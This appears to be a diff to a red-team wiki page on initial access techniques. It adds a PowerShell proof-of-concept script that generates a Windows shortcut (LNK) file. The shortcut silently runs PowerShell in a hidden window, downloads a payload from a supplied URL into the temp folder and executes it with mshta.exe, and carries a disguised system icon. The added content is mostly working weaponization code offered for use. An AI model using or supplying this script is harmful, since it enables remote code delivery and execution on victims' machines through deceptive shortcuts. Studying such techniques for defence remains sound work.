@@ -43,6 +43,28 @@
 - Enables obfuscation and packing techniques harder to detect statically
 - `mshta.exe` automatically parses multiple formats
 
+---
+This code create a LNK file using powershell, here is a POC [Link](https://github.com/CyberSecurityUP/Initial-Access-Techniques/blob/main/LNK/LNK-Generate.ps1)
+```powershell
+param(
+    [Parameter(Mandatory=$true)]
+    [string]$URL,
+    
+    [Parameter(Mandatory=$true)]
+    [string]$Output,
+    
+    [string]$Icon = "C:\Windows\System32\imageres.dll,48"
+)
+
+# Create LNK file using COM object
+$WshShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut($Output)
+$Shortcut.TargetPath = "powershell.exe"
+$Shortcut.Arguments = "-windowstyle hidden -Command `"Start-Process -WindowStyle Hidden mshta.exe `$env:TEMP\payload.html`"; Invoke-WebRequest -Uri '$URL' -OutFile `$env:TEMP\payload.html"
+$Shortcut.IconLocation = $Icon
+$Shortcut.Save()
+```
+
 
 # WikiLinks
 - https://docs.redteamleaders.com/offensive-security/initial-access/weaponized-lnk-files-for-initial-access-and-delivery
